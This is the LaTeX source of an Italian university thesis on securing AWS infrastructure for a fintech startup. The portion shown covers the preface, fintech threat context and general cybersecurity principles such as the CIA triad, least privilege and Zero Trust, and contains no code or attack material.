\documentclass[a4paper,12pt]{report}
% per le accentate
\usepackage[utf8]{inputenc}
\usepackage{lmodern}
\usepackage[T1]{fontenc}
\usepackage[backend=biber,style=ieee,sorting=none]{biblatex}
\addbibresource{references.bib}
%
% \includeonly{}
%
%			PREAMBOLO
%
\usepackage[a4paper]{geometry}
\usepackage{amssymb,amsmath,amsthm}
\usepackage{graphicx}
\usepackage{url}
\usepackage{booktabs}
\usepackage{hyperref}
\usepackage[italian]{babel}
\usepackage{setspace}
\usepackage{comment} % Per blocchi di codice
\usepackage{tesi}
\usepackage{listings} % Per blocchi di codice
\usepackage{xcolor} % Per colori nel codice

\usepackage{csquotes} % Per virgolette corrette (\enquote{})
% per le accentate
\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{0.95,0.95,0.92}

\lstdefinestyle{mystyle}{
backgroundcolor=\color{backcolour},
commentstyle=\color{codegreen},
keywordstyle=\color{magenta},
numberstyle=\tiny\color{codegray},
stringstyle=\color{codepurple},
basicstyle=\ttfamily\small,
breakatwhitespace=false,
breaklines=true,
captionpos=b,
keepspaces=true,
numbers=left,
numbersep=5pt,
showspaces=false,
showstringspaces=false,
showtabs=false,
tabsize=2
}

\lstset{style=mystyle}
% Definizione linguaggio JSON per listings
\lstdefinelanguage{json}{
    keywords={true,false,null},
    sensitive=false,
    morestring=[b]",
    comment=[l]{//},
    morecomment=[s]{/*}{*/},
}
% Definizione stile per codice JSON
\lstdefinestyle{json}{
    language=json,
    basicstyle=\small\ttfamily,
    numbers=left,
    numberstyle=\tiny\color{gray},
    stepnumber=1,
    numbersep=5pt,
    backgroundcolor=\color{white},
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    frame=single,
    rulecolor=\color{black},
    tabsize=2,
    captionpos=b,
    breaklines=true,
    breakatwhitespace=false,
    title=\lstname,
    keywordstyle=\color{blue},
    commentstyle=\color{gray},
    stringstyle=\color{red!60!black},
    escapeinside={\%*}{*},
    morestring=[b]",
    literate=
      *{0}{{{\color{red!60!black}0}}}{1}
      {1}{{{\color{red!60!black}1}}}{1}
      {2}{{{\color{red!60!black}2}}}{1}
      {3}{{{\color{red!60!black}3}}}{1}
      {4}{{{\color{red!60!black}4}}}{1}
      {5}{{{\color{red!60!black}5}}}{1}
      {6}{{{\color{red!60!black}6}}}{1}
      {7}{{{\color{red!60!black}7}}}{1}
      {8}{{{\color{red!60!black}8}}}{1}
      {9}{{{\color{red!60!black}9}}}{1}
      {:}{{{\color{black}:}}}{1}
      {,}{{{\color{black},}}}{1}
      {\{}{{{\color{black}\{}}}{1}
      {\}}{{{\color{black}\}}}}{1}
      {[}{{{\color{black}[}}}{1}
      {]}{{{\color{black}]}}}{1}
}


% Definizione stile per codice Python migliorato
\lstdefinestyle{python}{
    language=Python,
    basicstyle=\small\ttfamily,                     % Testo monospaziato, dimensione piccola
    numbers=left,                                    % Numeri di riga a sinistra
    numberstyle=\tiny\color{gray},                   % Numerazione grigio chiaro, dimensione ridotta
    stepnumber=1,                                    % Incremento numeri di riga di 1
    numbersep=5pt,                                   % Spazio tra numeri e codice
    backgroundcolor=\color{gray!10},                 % Sfondo grigio molto chiaro (10%)
    showspaces=false,
    showstringspaces=false,
    showtabs=false,
    frame=single,                                    % Cornice singola attorno al blocco
    rulecolor=\color{gray!60},                       % Colore della cornice grigio scuro (60%)
    tabsize=2,                                       % Tabulazioni di 2 spazi
    captionpos=b,                                    % Didascalia in basso
    breaklines=true,                                 % Spezzare le righe troppo lunghe
    breakatwhitespace=true,                          % Spezzare preferibilmente sugli spazi
    title=\lstname,                                  % Usa il nome del file come titolo del blocco
    keywordstyle=\color{blue!80!black}\bfseries,     % Parole chiave in blu scuro e grassetto
    commentstyle=\color{green!50!black}\itshape,     % Commenti in verde scuro corsivo
    stringstyle=\color{orange!80!black},             % Stringhe in arancio scuro
    emphstyle=\color{red!70!black}\bfseries,          % Evidenziazioni extra in rosso scuro (per emph)
    escapeinside={\%*}{*},                           % Permette di inserire commenti LaTeX all’interno
    morekeywords={boto3, iam, lambda_handler, event, context, client, update_user, UserName, PermissionsBoundary},
    % Aggiunta di built-in e funzioni Python comunemente usate
    morekeywords=[2]{def, return, import, as, if, elif, else, for, while, in, try, except, with, class, from, pass, True, False, None},
    keywordstyle=[2]\color{purple!70!black}\bfseries, % Secondo gruppo di keyword in viola scuro 
    xleftmargin=5pt,                                 % Margine interno sinistro
    xrightmargin=5pt,                                % Margine interno destro
    % ---- Opzionale: evidenzia il prompt ">>>" di un REPL Python ----
    moredelim=[is][\color{red!70!black}\bfseries]{>>>}{\ }, 
}

    % Definizione stile per codice Bash migliorato
    \lstdefinestyle{bash}{
        language=bash,
        basicstyle=\small\ttfamily,
        numbers=left,
        numberstyle=\tiny\color{gray},
        stepnumber=1,
        numbersep=5pt,
        backgroundcolor=\color{gray!10},
        showspaces=false,
        showstringspaces=false,
        frame=single,
        rulecolor=\color{gray!60},
        tabsize=2,
        captionpos=b,
        breaklines=true,
        breakatwhitespace=true,
        title=\lstname,
        keywordstyle=\color{blue!80!black},
        commentstyle=\color{green!50!black}\itshape,
        stringstyle=\color{orange!80!black},
        escapeinside={\%*}{*},
        morekeywords={aws, sts, assume-role, --role-arn, --role-session-name},
        xleftmargin=5pt,
        xrightmargin=5pt,
    }




%
%			TITOLO
\begin{document}

% Aggiunta immagine sopra al titolo
\begin{center}
        \includegraphics[width=0.2\textwidth]{images/Unimi-logo.png}
        \vspace{1cm}
\end{center}

\title{Sicurezza dell'Infrastruttura AWS in una Startup Fintech}
\author{Andrea Ferraboli}
\dept{Corso di Laurea in Sicurezza dei Sistemi e delle Reti Informatiche } 
\anno{2024-2025}
\matricola{09985A}
\relatore{Prof. Claudio Agostino Ardagna}
\correlatore{Lorenzo Perotta, Andrea Pasini, Simone Cortese}

\beforepreface
 \prefacesection{Prefazione}
        Immaginate un veliero agile e innovativo, una startup fintech, che solca le onde tumultuose del mercato finanziario globale. La sua velocità è la sua forza, la sua tecnologia all'avanguardia la sua vela maestra. Ma in queste acque, popolate da insidie digitali sempre più sofisticate, la robustezza dello scafo e l'affidabilità della bussola – ovvero una solida architettura di cybersecurity – diventano cruciali non solo per raggiungere la meta, ma per la sopravvivenza stessa del viaggio. Questo lavoro si addentra proprio in questo scenario, esplorando il delicato equilibrio tra la spinta propulsiva all'innovazione tipica delle startup fintech e l'imprescindibile necessità di una sicurezza informatica ferrea.

        La trattazione si snoda attraverso le sfide specifiche che queste giovani realtà digitali affrontano quotidianamente, proponendo strategie concrete e applicabili, con un'attenzione particolare all'ecosistema cloud di Amazon Web Services (AWS). Si analizzano non solo i mattoni fondamentali della protezione, come la gestione degli accessi e la difesa delle reti, ma anche strumenti di difesa proattiva come gli honeypot, veri e propri "specchietti per le allodole" digitali. Il tutto viene contestualizzato nel panorama dei principali framework e standard di sicurezza internazionali, offrendo così una prospettiva che lega la pratica alla teoria, con l'obiettivo finale di fornire spunti e metodologie per costruire infrastrutture resilienti, capaci di navigare sicure verso il futuro.

        Il percorso di questa tesi si articola come segue:
        Il \textbf{Capitolo 1}, intitolato "Introduzione", apre le porte sul mondo delle startup fintech, delineandone il contesto dinamico, le vulnerabilità intrinseche e le sfide uniche che devono affrontare nel campo della cybersecurity. Si mette in luce come un approccio proattivo alla sicurezza non rappresenti un mero costo, bensì un investimento strategico fondamentale.
        Successivamente, il \textbf{Capitolo 2}, "Principi di cybersecurity olistici per un'infrastruttura tech", getta le basi teoriche, esplorando i concetti cardine della sicurezza informatica – dalla triade CIA (Confidenzialità, Integrità, Disponibilità) alla difesa in profondità, fino al principio del minimo privilegio – calandoli nella realtà operativa delle startup.
        Il \textbf{Capitolo 3}, "Principi dell'Infrastruttura Cloud e Scelta di AWS", guida il lettore attraverso i paradigmi del cloud computing, confrontandoli con le tradizionali infrastrutture on-premises. Viene quindi introdotto Amazon Web Services (AWS) come piattaforma cloud di riferimento per molte realtà innovative, descrivendone l'architettura globale e i meccanismi che ne garantiscono scalabilità e flessibilità.
        Con il \textbf{Capitolo 4}, "Implementazioni Pratiche su AWS per una Startup Fintech", si entra nel vivo della progettazione, illustrando come tradurre i principi di sicurezza in configurazioni concrete all'interno dell'ambiente AWS. Si toccano temi cruciali come la gestione delle identità e degli accessi (IAM), la creazione di reti virtuali sicure (VPC), la protezione delle istanze di calcolo (EC2) e la salvaguardia dei dati sensibili.
        Il \textbf{Capitolo 5}, "Implementazione di un Honeypot in un'Infrastruttura AWS per Startup Fintech", è dedicato a uno strumento di difesa proattiva: l'honeypot. Se ne analizza la definizione, l'utilità, le diverse tipologie, i vantaggi e gli svantaggi, per poi passare alla descrizione di un'implementazione pratica su AWS, corredata da un'analisi dei costi e dalla simulazione di un attacco controllato per testarne l'efficacia.
        Infine, il \textbf{Capitolo 6}, "Compliance a standard internazionali e framework di sicurezza", chiude l'analisi, esaminando come le pratiche e le infrastrutture di sicurezza implementate si allineino ai principali standard e framework riconosciuti a livello globale, come il NIST Cybersecurity Framework, l'ISO/IEC 27001 e i principi della Zero Trust Architecture, offrendo una visione d'insieme sulla governance della sicurezza in un contesto fintech.
\prefacesection{Dedica}
{\hfill \Large {\sl dedicato a chi mi vuole bene, a chi mi stima e ai miei compagni di viaggio, vi voglio bene}}
\prefacesection{Ringraziamenti}
        Vorrei ringraziare soprattutto \dots
\afterpreface
\tableofcontents
\listoffigures % Comando per generare l'elenco delle figure
\addcontentsline{toc}{chapter}{Elenco delle Figure} % Aggiunge l'elenco delle figure all'indice

\chapter{Introduzione}
\pagenumbering{arabic}

\section{La Cybersecurity nelle Startup Fintech: Sfide, Vulnerabilità e Strategie di Protezione in un Ecosistema in Rapida Evoluzione}

Il settore fintech rappresenta oggi una delle aree più dinamiche e innovative dell'ecosistema startup, con investimenti globali che hanno raggiunto i 115 miliardi di dollari, in crescita esponenziale rispetto ai 53.2 miliardi del 2018 \cite{gartnerFintech}. Questo rapido sviluppo, caratterizzato dall'implementazione di tecnologie emergenti per i servizi finanziari, porta con sé non solo opportunità senza precedenti ma anche significative sfide in termini di sicurezza informatica. Le startup fintech, che si trovano all'intersezione tra finanza tradizionale e innovazione tecnologica, gestiscono dati estremamente sensibili diventando bersagli privilegiati per i cybercriminali. Questa tesi esplora le vulnerabilità specifiche di queste realtà, analizza le principali minacce che affrontano e propone strategie di sicurezza efficaci anche in contesti di risorse limitate, evidenziando come un approccio proattivo alla cybersecurity non rappresenti un costo ma un investimento strategico fondamentale per il successo a lungo termine di una startup fintech.
\subsection{Definizione di Fintech}

Nell'ambito economico-finanziario, con il termine \textbf{fintech} (contrazione di ``financial technology'') si indica l'\textbf{innovazione nei servizi finanziari} resa possibile dalle moderne tecnologie digitali \cite{tecnofinanza}. Una \textbf{startup fintech} è quindi una \textbf{nuova impresa} che opera nel settore della tecnologia finanziaria, basando il proprio modello di business sulle tecnologie ICT più avanzate e contrapponendosi agli approcci tradizionali degli operatori finanziari consolidati \cite{fintech_numeri}. 

Queste giovani aziende ad alta componente tecnologica mirano a migliorare l'accessibilità, l'efficienza e la qualità dei servizi finanziari, e stanno svolgendo un ruolo cruciale nella \textbf{digitalizzazione del mercato finanziario italiano} \cite{tecnofinanza}. 

Tra i servizi e le soluzioni tipicamente offerti dalle startup fintech vi sono:
\begin{itemize}
    \item \textbf{Pagamenti digitali} (ad esempio tramite app mobili)
    \item Trasferimenti di denaro \textbf{peer-to-peer}
    \item \textbf{Prestiti diretti tra privati} (social lending)
    \item \textbf{Finanziamento partecipativo} (crowdfunding)
    \item Servizi assicurativi innovativi legati all'\textbf{insurtech}
    \item Impiego di tecnologie come la \textbf{blockchain} e le \textbf{criptovalute} per abilitare nuovi servizi finanziari
\end{itemize}

In linea con la crescita globale del fenomeno, in Italia si contavano oltre \textbf{600 startup fintech e insurtech} attive nel 2023 \cite{fintech_numeri}, a testimonianza di un ecosistema in rapido sviluppo.
\subsection{Il Contesto delle Startup Fintech: Un Ecosistema Dinamico e Sfidante}

Le startup fintech operano in un ambiente caratterizzato da elevata incertezza, risorse limitate e necessità di crescita rapida, fattori che influenzano profondamente le decisioni in ambito IT e sicurezza informatica \cite{fintechChallenges}. A differenza delle istituzioni finanziarie tradizionali, queste realtà innovative non dispongono generalmente di strutture gerarchiche complesse o budget consistenti dedicati alla sicurezza, dovendo invece adottare approcci agili e flessibili.

Il contesto finanziario in cui operano le startup fintech impone pressioni significative sulle decisioni di spesa. Ogni investimento, compreso quello per l'infrastruttura IT e la sicurezza, deve essere attentamente valutato in termini di ritorno immediato e benefici a lungo termine \cite{fintechChallenges}. Questa ottimizzazione dei costi rappresenta una sfida continua, poiché la sicurezza informatica richiede investimenti costanti, spesso non producendo risultati immediatamente visibili, la cui assenza può comportare conseguenze catastrofiche. In questo equilibrio delicato, le startup fintech devono trovare il giusto compromesso tra la necessità di scalare rapidamente e l'implementazione di solide misure di protezione.

\subsection{La Distinzione tra Cybersecurity Bancaria e Fintech}

Un aspetto fondamentale da considerare è la sostanziale differenza tra l'approccio alla cybersecurity nel settore bancario tradizionale e nelle startup fintech. Mentre le banche operano in un contesto fortemente regolamentato, con obblighi legali precisi in materia di sicurezza e protezione dei dati, le fintech hanno tradizionalmente goduto di una maggiore flessibilità normativa \cite{bankingVsFintech}. Le grandi istituzioni bancarie investono ingenti risorse nel testare costantemente le proprie misure di sicurezza, consapevoli che anche il minimo incidente può comportare la perdita di migliaia di clienti e sanzioni finanziarie significative.

Le fintech, spesso costituite da piccole startup in rapida espansione, possono fungere da "overlay" per le banche, facilitando la fornitura di servizi finanziari innovativi ma operando inizialmente con regolamentazioni meno stringenti \cite{bankingVsFintech}. Questa differenza normativa sta tuttavia diminuendo, soprattutto per quelle fintech che si trasformano gradualmente in vere e proprie banche, sottoponendosi così a un maggiore scrutinio regolamentare. La sfida per le startup fintech consiste quindi nel bilanciare l'agilità operativa con l'adozione di standard di sicurezza elevati, anticipando l'evoluzione normativa del settore.

\subsection{Sfide Principali per le Startup Fintech in Ambito Cybersecurity}

Le startup fintech affrontano sfide specifiche nel campo della sicurezza informatica, che derivano dalla loro natura innovativa e dalle caratteristiche distintive del loro modello di business \cite{fintechChallenges}. La prima e più evidente sfida è rappresentata dal budget limitato per la sicurezza, che spesso costringe a difficili compromessi tra lo sviluppo di nuove funzionalità e l'implementazione di adeguate misure protettive. Questa limitazione finanziaria si riflette anche nella difficoltà di attrarre e mantenere personale specializzato in cybersecurity, un ambito in cui la domanda supera ampiamente l'offerta e le grandi aziende possono offrire compensi difficilmente pareggiabili da una startup.

La pressione per un rapido accesso al mercato rappresenta un'ulteriore sfida significativa. Nel settore fintech, essere i primi a offrire un servizio innovativo può fare la differenza tra il successo e il fallimento, ma questa corsa contro il tempo spesso porta a sottovalutare gli aspetti legati alla sicurezza \cite{fintechChallenges}. Inoltre, la scalabilità dell'infrastruttura IT rappresenta una sfida tecnica considerevole: progettare sistemi che siano non solo sicuri ma anche in grado di crescere rapidamente al crescere dell'azienda richiede competenze specifiche e una pianificazione accurata.

L'adozione di tecnologie emergenti, caratteristica distintiva delle fintech, introduce nuove superfici di attacco e vulnerabilità potenziali \cite{fintechChallenges}. Cloud computing, intelligenza artificiale, blockchain e API aperte offrono opportunità straordinarie ma richiedono approcci di sicurezza specifici e aggiornati. Allo stesso tempo, la crescente interconnessione con partner, fornitori e piattaforme di terze parti amplia ulteriormente la superficie di attacco, rendendo la gestione del rischio ancora più complessa.

Non va sottovalutato, infine, il rischio rappresentato dalle minacce interne (insider threats). Nelle fasi iniziali di una startup, quando i controlli sono meno rigidi e le procedure di sicurezza meno formalizzate, il rischio legato a dipendenti negligenti o, in casi più rari, malintenzionati, aumenta considerevolmente \cite{fintechChallenges}. La cultura della condivisione e dell'apertura, tipica delle startup, deve quindi essere bilanciata con adeguate politiche di accesso e controllo.

\subsection{Minacce e Attacchi Informatici nel Settore Fintech}

Il settore fintech, per la sua natura altamente tecnologica e la gestione di dati finanziari sensibili, è diventato uno dei bersagli preferiti dei cybercriminali \cite{cyberThreatsFintech}. Tra le minacce più diffuse e pericolose figurano gli attacchi di phishing, attraverso i quali i malintenzionati cercano di ottenere credenziali di accesso, dati personali o informazioni finanziarie utilizzando email, messaggi e siti web fraudolenti che imitano comunicazioni ufficiali \cite{cyberThreatsFintech}. Queste tecniche di social engineering sfruttano la fiducia degli utenti e le loro abitudini digitali per compromettere account e sistemi aziendali.

I malware e i ransomware rappresentano un'altra categoria di minacce particolarmente grave per le startup fintech. Questi software malevoli possono infiltrarsi nei sistemi attraverso vari vettori, bloccare l'accesso ai dati e richiedere un riscatto per ripristinarlo, causando danni finanziari diretti e interruzioni operative significative \cite{cyberThreatsFintech}. Le conseguenze di un attacco ransomware possono essere devastanti per una startup con risorse limitate, in quanto il riscatto diventa percentualmente troppo oneroso per le finanze aziendali.

Gli attacchi alle API (Application Programming Interfaces), sempre più utilizzate nel settore fintech per l'integrazione con servizi terzi, costituiscono un vettore di attacco in crescita \cite{fintechChallenges}. Le API mal configurate o non adeguatamente protette possono diventare punti di ingresso privilegiati per i cybercriminali, consentendo l'accesso non autorizzato a dati sensibili e funzionalità critiche del sistema. Simile criticità presentano le configurazioni errate dei servizi cloud, che possono esporre involontariamente dati riservati o creare vulnerabilità sfruttabili.

Le startup fintech devono inoltre considerare il rischio di attacchi DDoS (Distributed Denial of Service), che mirano a rendere inaccessibili i servizi sovraccaricando i server con richieste fraudolente \cite{fintechChallenges}. Questi attacchi, relativamente semplici da orchestrare ma potenzialmente molto dannosi, possono essere utilizzati sia come attacco diretto che come diversivo per mascherare altre attività malevoli più sofisticate.

\subsection{Conseguenze degli Attacchi e Impatto sulle Startup Fintech}

L'impatto di un attacco informatico su una startup fintech può essere multidimensionale e, in molti casi, esistenziale. A livello finanziario, oltre ai costi diretti per il ripristino dei sistemi e la gestione dell'incidente, vanno considerati i potenziali risarcimenti a clienti danneggiati, le sanzioni normative e l'aumento dei premi assicurativi \cite{fintechChallenges}. Ma è forse l'impatto reputazionale a rappresentare la minaccia più grave: in un settore basato sulla fiducia come quello finanziario, una violazione dei dati può comprometterne irreparabilmente l'immagine, portando alla perdita di clienti attuali e potenziali.

L'interruzione operativa conseguente a un attacco può avere effetti a catena, influenzando non solo i clienti diretti ma anche partner commerciali e fornitori \cite{fintechChallenges}. In un ecosistema interconnesso come quello fintech, l'interdipendenza tra diverse piattaforme e servizi amplifica ulteriormente l'impatto di un incidente di sicurezza, con effetti che possono estendersi ben oltre il perimetro aziendale immediato.

\subsection{Importanza di un Approccio Proattivo alla Cybersecurity}

Implementare una strategia di cybersecurity solida sin dalle prime fasi di sviluppo di una startup fintech non configura un semplice onere, bensì un investimento strategico di primaria importanza \cite{fintechChallenges}. L'adozione del paradigma "security by design" permette infatti di integrare la sicurezza in maniera organica nei processi aziendali e nel ciclo di sviluppo del prodotto, contribuendo alla significativa riduzione dei costi a lungo termine e alla minimizzazione dei rischi potenziali. Al contrario, la mancata attenzione alla sicurezza nelle fasi iniziali comporta l'accumulo di "security debt", ovvero un debito tecnico in ambito sicurezza che, analogamente a un mutuo con tassi elevati, diventa progressivamente più oneroso da gestire e da ripagare nel tempo. Infine, la pressione derivante dalla necessità di accelerare lo sviluppo e di raggiungere rapidamente il mercato può portare a trascurare aspetti fondamentali della sicurezza, esacerbando ulteriormente tale debito tecnico.

Un approccio preventivo alla sicurezza risulta sempre più efficace ed economico rispetto a uno reattivo \cite{fintechChallenges}. I costi per implementare misure di sicurezza di base sono generalmente inferiori rispetto a quelli necessari per rispondere a un incidente, che possono includere non solo il ripristino dei sistemi ma anche sanzioni, risarcimenti e danni reputazionali. La cybersecurity deve quindi essere considerata come parte integrante della strategia aziendale, non come un elemento accessorio o un costo da minimizzare.

Le startup fintech devono inoltre considerare che adeguati livelli di sicurezza rappresentano spesso un requisito fondamentale per attrarre investitori e partner commerciali \cite{fintechChallenges}. Durante le fasi di due diligence, l'analisi delle misure di sicurezza implementate è diventata una componente standard, e lacune significative in questo ambito possono compromettere opportunità di finanziamento o collaborazioni strategiche.

\subsection{Approccio Metodologico della Tesi}

Questa tesi si propone di affrontare le sfide della cybersecurity nelle startup fintech attraverso un approccio metodologico strutturato ma flessibile \cite{fintechChallenges}. Pur concentrandosi su un caso studio pratico specifico, l'obiettivo è fornire principi e best practice di sicurezza generici e applicabili a qualsiasi startup fintech, indipendentemente dalla piattaforma tecnologica specifica utilizzata. L'approccio adottato riconosce le limitazioni di risorse tipiche delle startup e propone soluzioni scalabili che possono evolvere con la crescita dell'organizzazione.

La metodologia si basa su tre pilastri fondamentali: l'identificazione delle minacce specifiche per il modello di business fintech, la prioritizzazione degli interventi in base al rapporto rischio/beneficio e l'implementazione di controlli di sicurezza essenziali ma efficaci \cite{fintechChallenges}. Questo approccio pragmatico consente di ottenere un livello di protezione adeguato anche con risorse limitate, concentrando gli sforzi sugli aspetti più critici.

\section{Principi di cybersecurity olistici per un'infrastruttura tech}
\subsection{Introduzione}
Nell'analisi e nello studio dell'infrastruttura di una startup fintech, per comprendere le possibili implementazioni a livello di sicurezza dobbiamo prima delineare quali siano i principi di cybersecurity a cui ogni startup, fintech o meno, deve attenersi. In questo capitolo verranno analizzati i principi di cybersecurity più importanti e quali sono le principali sfide che un'azienda di piccole dimensioni può affrontare all'inizio del proprio percorso nell'adozione di tali pratiche.

Questo capitolo esplora i principi fondamentali di sicurezza informatica che ogni organizzazione dovrebbe implementare, con particolare attenzione alle sfide uniche che le startup fintech affrontano nell'adozione di tali pratiche. Il settore fintech, caratterizzato da rapida innovazione e gestione di dati finanziari sensibili, presenta un contesto particolarmente critico dove le best practice di sicurezza si scontrano spesso con le esigenze di velocità di sviluppo, risorse limitate e necessità di time-to-market accelerato.

\section{Principi di cybersecurity}
\label{sec:principi-cybersecurity}

\subsection{Triade CIA}
La Triade CIA rappresenta i tre pilastri fondamentali dell'information security: confidentiality (riservatezza), integrity (integrità) e availability (disponibilità) \cite{NIST_SP_1800_26}. Questi principi costituiscono la base su cui costruire qualsiasi strategia di sicurezza informatica robusta.

\begin{itemize}
\item \textbf{Confidentiality}: La riservatezza si concentra sul preservare le restrizioni autorizzate sull'accesso e la divulgazione delle informazioni, inclusi i mezzi per proteggere la privacy personale e le informazioni proprietarie \cite{NIST_SP_1800_26}. Questo principio viene generalmente rispettato tramite la crittografia dei dati, sia a riposo (stored data) che in transito (data in transit), controlli di accesso rigorosi, come liste di controllo degli accessi (ACL), autenticazione a più fattori (MFA) e Role-Based Access Control (RBAC).

text
Nel contesto di una startup fintech, l'implementazione della riservatezza presenta sfide significative. L'accesso ai dati dei clienti e alle informazioni finanziarie deve essere rigorosamente controllato, ma i team piccoli e multifunzionali tipici delle startup spesso portano a una condivisione delle credenziali o all'assegnazione di privilegi eccessivi per "far funzionare le cose rapidamente".

La gestione delle chiavi di cifratura rappresenta un'ulteriore complessità: nelle startup dove i ruoli non sono chiaramente definiti, la responsabilità della gestione delle chiavi può essere ambigua, portando potenzialmente a compromissioni della sicurezza.

\item \textbf{Integrity}: L'integrità dei dati comporta la protezione contro modifiche o distruzioni improprie delle informazioni e garantisce la non ripudiabilità e l'autenticità delle informazioni \cite{NIST_SP_1800_26}. Mantenere l'integrità dei dati è essenziale per prevenire la diffusione di informazioni corrotte o ingannevoli, che potrebbero avere gravi ripercussioni in settori critici come quello sanitario o finanziario. Le tecniche utilizzate per preservare l'integrità includono:
\begin{itemize}
    \item Funzioni di hash crittografiche (es. SHA-256) per verificare che i dati non siano stati alterati.
    \item Firme digitali per autenticare l'origine dei dati e garantirne la non modifica.
    \item Controllo delle versioni per tracciare le modifiche e ripristinare versioni precedenti.
    \item Checksum e meccanismi di rilevamento degli errori.
\end{itemize}

Nel contesto di una startup fintech, l'integrità dei dati è uno di quegli aspetti che va ad inficiare la brand reputation della startup stessa, in quanto la fiducia degli stakeholders si basa anche sulla capacità della startup di conservare i dati dei clienti senza distorsioni e di garantire l'accuratezza nelle transazioni di dati nella maniera più professionale possibile.

\item \textbf{Availability}: Questo principio assicura l'accesso affidabile e tempestivo alle informazioni \cite{NIST_SP_1800_26}. Mira a prevenire interruzioni del servizio, sia dovute a guasti tecnici che ad attacchi malevoli come i Denial-of-Service (DoS) o Distributed Denial-of-Service (DDoS). L'indisponibilità può causare interruzioni operative, perdite economiche e danni alla reputazione. Le strategie per garantire un'elevata disponibilità comprendono:
\begin{itemize}
    \item Sistemi ridondanti (hardware, software, reti) per eliminare singoli punti di fallimento (Single Points of Failure - SPOF).
    \item Backup regolari e piani di disaster recovery (DR) e business continuity (BCP).
    \item Tecniche di bilanciamento del carico (load balancing) per distribuire il traffico di rete.
    \item Misure di protezione contro attacchi DoS/DDoS.
\end{itemize}

Nella maggior parte delle startup, l'infrastruttura di base viene sviluppata considerando una capacità di carico massimo limitato, in quanto nei primi periodi di vita dell'azienda non ci si aspetta un elevato numero di utenti. Proprio per questo motivo, l'infrastruttura presenta un punto vulnerabile che può essere sfruttato dagli attaccanti per mettere a repentaglio l'intero sistema, ad esempio con attacchi DoS/DDoS mirati al perimetro aziendale.
\end{itemize}

\subsection{Difesa in Profondità (Defense in Depth)}
Il principio di difesa in profondità prevede l'implementazione di una stratificazione delle risorse informatiche di protezione \cite{Cyberment}. Questo approccio permette di rallentare la penetrazione di un eventuale attacco esterno, al fine di avere poi il tempo necessario per una efficace reazione protettiva. La strategia di difesa in profondità fornisce la fondazione per una protezione multidimensionale che include tre componenti mutualmente supportive e rinforzanti: (1) architettura resistente alla penetrazione, (2) operazioni di limitazione dei danni, e (3) progettazione per la cyber resilienza e la sopravvivenza \cite{NIST_SP_800_172}.

Nelle startup fintech, l'implementazione della difesa in profondità è spesso compromessa da vincoli di risorse e pressioni temporali. Ad esempio, mentre una soluzione di autenticazione a più fattori (MFA) è essenziale per proteggere l'accesso a dati finanziari sensibili, una startup potrebbe inizialmente implementare solo l'autenticazione basata su password per accelerare l'onboarding degli utenti, pianificando di aggiungere MFA "in un secondo momento" – un momento che potrebbe non arrivare prima che si verifichi un incidente di sicurezza.

La segmentazione della rete, fondamentale per contenere eventuali violazioni, richiede una progettazione accurata dell'infrastruttura. Tuttavia, nelle fasi iniziali, molte startup fintech operano con architetture di rete piatte per semplificare lo sviluppo e ridurre il sovraccarico operativo, oltre a non disporre del capitale umano competente per gestire una tale complessità.

\subsection{Principio del Minimo Privilegio}
Il principio del minimo privilegio stabilisce che un sistema dovrebbe limitare i privilegi di accesso degli utenti (o dei processi che agiscono per conto degli utenti) al minimo necessario per svolgere le attività assegnate \cite{NIST_Glossary}. Questo principio dichiara che un'architettura di sicurezza è progettata in modo che a ciascuna entità siano concesse le minime autorizzazioni e risorse di sistema necessarie per svolgere la propria funzione \cite{NIST_Glossary}.

Nelle startup fintech, applicare il principio del minimo privilegio presenta sfide uniche. La cultura focalizzata sulla velocità d'esecuzione spinge spesso a trascurare la sicurezza granulare degli accessi. È forte la tentazione di assegnare privilegi amministrativi ampi e generici per accelerare lo sviluppo, piuttosto che investire tempo nella configurazione di permessi specifici per ogni compito.

Un esempio comune è concedere a tutti gli sviluppatori accesso completo al database di produzione durante la creazione di una nuova dashboard, invece di limitare ciascuno alle sole tabelle o operazioni strettamente necessarie. Sebbene sembri una scorciatoia efficiente, questa pratica crea vulnerabilità critiche: la compromissione di un singolo account può esporre una quantità sproporzionata di dati sensibili, amplificando enormemente i danni di una violazione.

\subsection{Separazione dei Compiti (Separation of Duties)}
La separazione dei compiti include la divisione delle funzioni di missione o business e le funzioni di supporto tra diverse persone o ruoli, conducendo funzioni di supporto al sistema con individui diversi, e assicurando che il personale di sicurezza che amministra le funzioni di controllo degli accessi non amministri anche le funzioni di audit \cite{OSCAL_Content}. Poiché le violazioni della separazione dei compiti possono estendersi a sistemi e domini di applicazioni, le organizzazioni considerano l'interezza dei sistemi e dei componenti del sistema quando sviluppano politiche sulla separazione dei compiti \cite{OSCAL_Content}.

Nelle startup fintech, dove i team sono piccoli e i ruoli spesso sovrapposti, questo principio è particolarmente difficile da attuare. Ad esempio, in una startup che sviluppa una piattaforma di prestiti P2P, potrebbe esserci un solo ingegnere responsabile sia dell'implementazione del sistema di scoring del credito sia della configurazione dei controlli di sicurezza sullo stesso sistema. Questa concentrazione di responsabilità crea un rischio intrinseco: errori o azioni malevole potrebbero passare inosservati senza un secondo paio di occhi che verifichi il lavoro.

\subsection{Zero Trust}
Il modello Zero Trust si basa sul concetto che un'organizzazione non dovrebbe fidarsi automaticamente di nulla sia all'interno che all'esterno dei suoi perimetri e deve verificare tutto ciò che tenta di connettersi ai suoi sistemi prima di concedere l'accesso \cite{NIST_SP_800_207}. Zero Trust è una risposta evoluta alle tendenze che includono la migrazione delle risorse di lavoro verso ambienti cloud, lavoratori che operano da dispositivi mobili ovunque si trovino e una crescente collaborazione tra organizzazioni \cite{NIST_SP_800_207}.

Per una startup fintech, l'adozione rigorosa del principio di Zero Trust può rivelarsi particolarmente gravosa. Nelle fasi iniziali, è frequente che l'intera infrastruttura sia gestita da una sola persona, con responsabilità sia di sviluppo sia di amministrazione di rete: questo crea un unico punto di falla, amplificando il rischio di errori di configurazione o di accesso non autorizzato.

Inoltre, le limitate risorse economiche e umane possono rendere difficoltoso implementare soluzioni avanzate di micro-segmentazione, sistemi di Identity and Access Management (IAM) complessi e piattaforme di monitoraggio continuo. Infine, la mancanza di separazione dei compiti e di revisioni periodiche rende più probabile la persistenza di permessi eccessivi o non aggiornati, esponendo i sistemi a potenziali attacchi laterali e perdite di dati sensibili.

\chapter{Principi di cybersecurity olistici per un'infrastruttura tech}
\label{ch:principi-cybersecurity}
\subsection{Introduzione}
